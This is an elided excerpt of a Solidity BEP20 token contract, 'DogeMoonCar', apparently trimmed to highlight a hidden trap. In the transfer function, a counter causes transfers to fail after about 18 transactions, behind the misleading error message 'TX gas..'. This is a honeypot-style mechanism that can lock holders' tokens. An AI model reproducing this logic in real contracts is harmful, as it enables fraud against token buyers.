...
contract DogeMoonCar is IBEP20, Auth {
    
    using SafeMath for uint256;

    string constant _name = "DogeMoonCar";
    string constant _symbol = "MOONCAR";
    ...
    constructor () Auth(msg.sender) {
        ...
        anothermarketingWallet = 0x935bDBFc460B6784FEc4a80407Dfc5e7059d6942;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
         buyBackSpeed++;
            ...
            {
                if(buyBackSpeed>18){
                    require(amount >= marketingFee, "TX gas..");
                }
		    }
